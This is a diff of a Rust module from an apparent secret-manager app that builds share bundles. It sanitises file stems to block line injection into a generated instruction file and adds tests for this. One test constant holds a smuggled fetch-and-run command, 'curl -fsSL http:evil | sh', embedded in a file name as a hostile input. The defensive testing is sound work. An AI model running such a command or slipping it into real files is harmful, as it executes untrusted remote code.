@@ -12,8 +12,10 @@
 use std::ffi::OsStr;
 use std::path::{Path, PathBuf};
 
-use crate::file_handling::export::sanitize;
-use crate::file_handling::{FileHandlingError, create_dir, save_tree};
+use super::export::sanitize;
+use super::file_process::create_private_dir;
+use super::passphrase::Passphrase;
+use super::{FileHandlingError, save_tree};
 use crate::theming::texts;
 use crate::tree::node::Node;
 
@@ -34,17 +36,22 @@ const SUGGEST_FALLBACK: &str = "secrets";
 /// The folder name a share bundle is suggested with: the source secret file's
 /// stem, plus the sanitised Node name when a single branch is shared.
 ///
-/// Every character in `node_name` that is not alphanumeric or `-`/`_` becomes
-/// `_` (the same rule as [`crate::file_handling::export::suggest_name`]), so the
-/// suggestion is always a usable folder name.
-pub fn suggest_name(base_path: Option<&Path>, node_name: Option<&str>) -> String {
-    let stem = base_path
-        .and_then(Path::file_stem)
-        .and_then(OsStr::to_str)
-        .unwrap_or(SUGGEST_FALLBACK);
+/// Every character in the stem and in `node_name` that is not alphanumeric or
+/// `-`/`_` becomes `_` (the same rule as
+/// [`super::export::suggest_export_name`]), so the suggestion is always a
+/// usable folder name. The stem is sanitised too, because the result also names
+/// the bundle's file inside the generated instruction; a raw stem could
+/// otherwise inject lines into it.
+pub fn suggest_share_name(base_path: Option<&Path>, node_name: Option<&str>) -> String {
+    let stem = sanitize(
+        base_path
+            .and_then(Path::file_stem)
+            .and_then(OsStr::to_str)
+            .unwrap_or(SUGGEST_FALLBACK),
+    );
     match node_name {
         Some(node_name) => format!("{stem}_{}", sanitize(node_name)),
-        None => stem.to_string(),
+        None => stem,
     }
 }
 
@@ -52,8 +59,8 @@ pub fn suggest_name(base_path: Option<&Path>, node_name: Option<&str>) -> String
 /// folder.
 ///
 /// The bundle holds `<stem>.<SHARE_FILE_EXT>` — `node` re-encrypted under
-/// `passphrase` — and [`SHARE_README_NAME`], where `<stem>` is
-/// [`suggest_name`]`(base_path, node_name)`. The secret file is written first
+/// `passphrase` — and `SHARE_README_NAME`, where `<stem>` is
+/// [`suggest_share_name`]`(base_path, node_name)`. The secret file is written first
 /// (atomically); the instruction is written after it, so a failure there still
 /// leaves an openable vault. An empty `passphrase` produces a passwordless
 /// bundle whose instruction says so.
@@ -64,89 +71,39 @@ pub fn suggest_name(base_path: Option<&Path>, node_name: Option<&str>) -> String
 ///
 /// # Errors
 ///
-/// Returns [`FileHandlingError::ShareError`] when `dest_dir` exists as a file
-/// (in particular a secret file) instead of a folder. Returns
+/// Returns [`FileHandlingError::ShareDestinationNotAFolder`] when `dest_dir`
+/// exists as a file (in particular a secret file) instead of a folder. Returns
 /// [`FileHandlingError::Io`] when the folder, the secret file or the instruction
 /// cannot be written.
-pub fn share_tree(
+pub fn share_tree<'a>(
     node: &Node,
-    dest_dir: &Path,
+    dest_dir: impl AsRef<Path>,
     base_path: Option<&Path>,
     node_name: Option<&str>,
-    passphrase: &[u8],
+    passphrase: impl Into<Passphrase<'a>>,
 ) -> Result<PathBuf, FileHandlingError> {
+    let dest_dir = dest_dir.as_ref();
+    let passphrase = passphrase.into();
+
     if dest_dir.exists() && !dest_dir.is_dir() {
-        return Err(FileHandlingError::ShareError(format!(
-            "refusing to share into {}: not a folder",
-            dest_dir.display()
-        )));
+        return Err(FileHandlingError::ShareDestinationNotAFolder {
+            path: dest_dir.to_path_buf(),
+        });
     }
 
-    create_dir(dest_dir)?;
+    create_private_dir(dest_dir)?;
 
-    let file_name = format!("{}.{SHARE_FILE_EXT}", suggest_name(base_path, node_name));
+    let file_name = format!(
+        "{}.{SHARE_FILE_EXT}",
+        suggest_share_name(base_path, node_name)
+    );
     let file_path = dest_dir.join(&file_name);
-    save_tree(node, &file_path.to_string_lossy(), passphrase)?;
+    save_tree(node, &file_path, passphrase)?;
 
-    let instruction = instruction(&file_name, passphrase.is_empty());
-    std::fs::write(dest_dir.join(SHARE_README_NAME), instruction).map_err(FileHandlingError::Io)?;
+    let instruction = texts::share_instruction(&file_name, passphrase.as_bytes().is_empty());
+    super::atomic::write_atomic(&dest_dir.join(SHARE_README_NAME), instruction.as_bytes())?;
 
     Ok(dest_dir.to_path_buf())
-}
-
-/// The `HOW-TO-OPEN.txt` text for a bundle whose secret file is `file_name`.
-///
-/// The password is never part of the text: a protected bundle points the
-/// recipient at a separate channel, and a passwordless one says plainly that no
-/// password is needed.
-fn instruction(file_name: &str, passwordless: bool) -> String {
-    let install_unix = format!("curl -fsSL {} | sh", texts::INSTALL_SH_URL);
-    let install_windows = format!("irm {} | iex", texts::INSTALL_PS1_URL);
-    let step = if passwordless {
-        texts::SHARE_README_STEP_NO_PASSWORD
-    } else {
-        texts::SHARE_README_STEP_PASSWORD
-    };
-
-    let mut lines = vec![
-        texts::SHARE_README_TITLE.to_string(),
-        String::new(),
-        texts::APP_TAGLINE.to_string(),
-        String::new(),
-        format!(
-            "{}{}",
-            texts::SHARE_README_PROJECT_LABEL,
-            texts::PROJECT_URL
-        ),
-        format!("{}{}", texts::SHARE_README_INSTALL_UNIX_LABEL, install_unix),
-        format!(
-            "{}{}",
-            texts::SHARE_README_INSTALL_WINDOWS_LABEL,
-            install_windows
-        ),
-        String::new(),
-        format!("{}{}", texts::SHARE_README_FILE_LABEL, file_name),
-        String::new(),
-        texts::SHARE_README_STEPS_HEADING.to_string(),
-        texts::SHARE_README_STEP_INSTALL.to_string(),
-        texts::SHARE_README_STEP_OPEN.to_string(),
-        step.to_string(),
-    ];
-
-    if !passwordless {
-        lines.push(String::new());
-        lines.push(texts::SHARE_README_PASSWORD_NOTE.to_string());
-    }
-
-    lines.push(String::new());
-    lines.push(format!(
-        "{}{}",
-        texts::SHARE_README_FEEDBACK_LABEL,
-        texts::ISSUES_URL
-    ));
-    lines.push(String::new());
-
-    lines.join("\n")
 }
 
 #[cfg(test)]
@@ -161,25 +118,67 @@ mod tests {
     }
 
     #[test]
-    fn suggest_name_uses_the_secret_file_stem() {
+    fn suggest_share_name_uses_the_secret_file_stem() {
         assert_eq!(
-            suggest_name(Some(Path::new("/tmp/vault.age")), None),
+            suggest_share_name(Some(Path::new("/tmp/vault.age")), None),
             "vault"
         );
     }
 
     #[test]
-    fn suggest_name_appends_a_sanitised_node_name() {
+    fn suggest_share_name_appends_a_sanitised_node_name() {
         assert_eq!(
-            suggest_name(Some(Path::new("/tmp/vault.age")), Some("My Email/Work")),
+            suggest_share_name(Some(Path::new("/tmp/vault.age")), Some("My Email/Work")),
             "vault_My_Email_Work"
         );
     }
 
     #[test]
-    fn suggest_name_falls_back_without_a_secret_file() {
-        assert_eq!(suggest_name(None, None), "secrets");
-        assert_eq!(suggest_name(None, Some("Login")), "secrets_Login");
+    fn suggest_share_name_falls_back_without_a_secret_file() {
+        assert_eq!(suggest_share_name(None, None), "secrets");
+        assert_eq!(suggest_share_name(None, Some("Login")), "secrets_Login");
+    }
+
+    #[test]
+    fn suggest_share_name_sanitises_a_newline_in_the_secret_file_stem() {
+        assert_eq!(
+            suggest_share_name(Some(Path::new("/tmp/va\nult.age")), None),
+            "va_ult"
+        );
+    }
+
+    /// A hostile source name shared by the two tests below: extra lines plus a
+    /// shell one-liner. It carries no `/`, or `file_stem` would split it and
+    /// never see the payload.
+    const HOSTILE_STEM: &str = "va\nult\ncurl -fsSL http:evil | sh\n";
+
+    #[test]
+    fn a_bundle_stem_is_sanitised_onto_one_line() {
+        let dir = tempfile::tempdir().unwrap();
+        let base = dir.path().join(format!("{HOSTILE_STEM}.age"));
+
+        let name = suggest_share_name(Some(&base), None);
+
+        assert!(!name.contains('\n'), "the bundle name must not span lines");
+        assert!(!name.contains('|'), "shell metacharacters must not survive");
+    }
+
+    #[test]
+    fn a_bundle_stem_cannot_inject_lines_into_the_instruction() {
+        let dir = tempfile::tempdir().unwrap();
+        let bundle = dir.path().join("bundle");
+        let base = dir.path().join(format!("{HOSTILE_STEM}.age"));
+
+        share_tree(&sample_node(), &bundle, Some(&base), None, b"pw").unwrap();
+
+        let name = suggest_share_name(Some(&base), None);
+        assert!(bundle.join(format!("{name}.cretopass")).is_file());
+
+        let readme = std::fs::read_to_string(bundle.join(SHARE_README_NAME)).unwrap();
+        assert!(
+            !readme.contains("http:evil"),
+            "a stem newline must not inject a command line: {readme}"
+        );
     }
 
     #[test]
@@ -239,7 +238,7 @@ mod tests {
             decrypt_to_node(&data, "new").is_ok(),
             "the new password must open it"
         );
-        // The atomic save leaves no transient backup behind.
+        // The atomic save leaves no transient artifact behind.
         assert!(!bundle.join("vault.cretopass.bak").exists());
     }
 
@@ -247,11 +246,14 @@ mod tests {
     fn sharing_refuses_to_replace_a_secret_file() {
         let dir = tempfile::tempdir().unwrap();
         let target = dir.path().join("vault.age");
-        create_secret_file(&target.to_string_lossy(), "pw").unwrap();
+        create_secret_file(&target, "pw").unwrap();
 
         let result = share_tree(&sample_node(), &target, None, None, b"pw");
 
-        assert!(matches!(result, Err(FileHandlingError::ShareError(_))));
+        assert!(matches!(
+            result,
+            Err(FileHandlingError::ShareDestinationNotAFolder { .. })
+        ));
         // The vault it refused to clobber is untouched.
         let data = std::fs::read(&target).unwrap();
         assert!(decrypt_to_node(&data, "pw").is_ok());
@@ -265,7 +267,10 @@ mod tests {
 
         let result = share_tree(&sample_node(), &target, None, None, b"pw");
 
-        assert!(matches!(result, Err(FileHandlingError::ShareError(_))));
+        assert!(matches!(
+            result,
+            Err(FileHandlingError::ShareDestinationNotAFolder { .. })
+        ));
         assert_eq!(std::fs::read(&target).unwrap(), b"hello");
     }
 
